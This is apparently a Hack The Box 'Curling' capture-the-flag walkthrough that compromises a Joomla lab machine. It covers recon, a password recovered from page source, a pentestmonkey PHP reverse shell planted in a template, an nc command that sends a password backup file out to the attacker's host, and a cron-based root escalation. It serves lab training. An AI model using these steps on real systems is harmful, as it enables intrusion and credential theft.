# Curling

![Curling.png](images//Curling.png)

# Recon

### PortScan

`nmap -sC -sV 10.10.10.150`

![Untitled](images//Untitled.png)

## Web ( 80 )

### Directory discover

`gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![Untitled](images//Untitled%201.png)

### Version

Version found inside `README.txt` file

![Untitled](images//Untitled%202.png)

### Scan Joomla

`joomscan --ec -u http://10.10.10.150/`

![Untitled](images//Untitled%203.png)

### Source code

Some `secret.txt` file

`view-source:http://10.10.10.150/`

![Untitled](images//Untitled%204.png)

Decode this string

![Untitled](images//Untitled%205.png)

`echo "Q3VybGluZzIwMTgh" | base64 -d`

![Untitled](images//Untitled%206.png)

`Curling2018!`

### Admin login

This message is signed by Floris so maybe the username is `floris`

![Untitled](images//Untitled%207.png)

Login using `floris:Curling2018!`

![Untitled](images//Untitled%208.png)

## Foot Hold

Go to the templates page

![Untitled](images//Untitled%209.png)

I used this template but there is another one

![Untitled](images//Untitled%2010.png)

Now put here some PHP RCE, this one is from pentestmonkey

![Untitled](images//Untitled%2011.png)

Open the `netcat` listener

`nc -lvnp 4444`

Access to `http://10.10.10.150/index.php`

And we got the shell

![Untitled](images//Untitled%2012.png)

## Privilege Escalation

### Upgrade shell

`python3 -c "import pty;pty.spawn('/bin/bash')”`

![Untitled](images//Untitled%2013.png)

### Backup file

`cat /home/floris/password_backup`

![Untitled](images//Untitled%2014.png)

Send that file to you local machine, i used nc to do that

Local machine

`nc -lp 1234 > password_backup`

On the victim

`nc -w 3 {LOCAL-IP} 1234 < password_backup`

`xxd -r password_backup > password.unhex`

![Untitled](images//Untitled%2015.png)

Change the extension to `.bz2` and unzip it

![Untitled](images//Untitled%2016.png)

Now lets use gzip to unzip

![Untitled](images//Untitled%2017.png)

Unzip it again

![Untitled](images//Untitled%2018.png)

Found the password

![Untitled](images//Untitled%2019.png)

Now we can login to `floris` using this password

![Untitled](images//Untitled%2020.png)

`ssh floris@curling.htb`

![Untitled](images//Untitled%2021.png)

### Enumeration

Run the `pyps64` to look at some cronjob, and we had this curl that uses inputs from a file called input

![Untitled](images//Untitled%2022.png)

### Root

We can modify that file so we can use this payload and when it will run again the output gonna be inside the report file

![Untitled](images//Untitled%2023.png)

Read the report file to get the flag

![Untitled](images//Untitled%2024.png)
